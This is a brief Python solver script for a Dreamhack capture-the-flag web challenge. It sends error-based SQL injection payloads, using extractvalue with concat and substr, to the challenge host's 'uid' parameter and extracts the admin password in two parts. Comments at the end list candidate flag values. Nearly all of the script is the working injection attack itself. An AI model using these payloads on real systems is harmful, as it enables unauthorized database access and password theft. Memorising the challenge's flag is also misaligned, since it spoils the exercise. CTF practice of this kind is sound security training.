import requests
url = "http://host3.dreamhack.games:11218/"

flag = ''
payload = f"admin' and extractvalue(1,concat(0x3a,substr((select upw from user where uid='admin'),1,29)));-- -"
res = requests.get(url, params={'uid':payload})
flag += res.text.split(":")[-1].split("'")[0]
payload = f"admin' and extractvalue(1,concat(0x3a,substr((select upw from user where uid='admin'),30,30)));-- -"
res = requests.get(url, params={'uid':payload})
flag += res.text.split(":")[-1].split("'")[0]

print(flag)
#DH{c3968c78840750168774ad951...c98bf788563c4d}
#DH{c3968c78840750168774ad951c98bf788563c4d}
#DH{c3968c78840750168774ad951fc98bf788563c4d}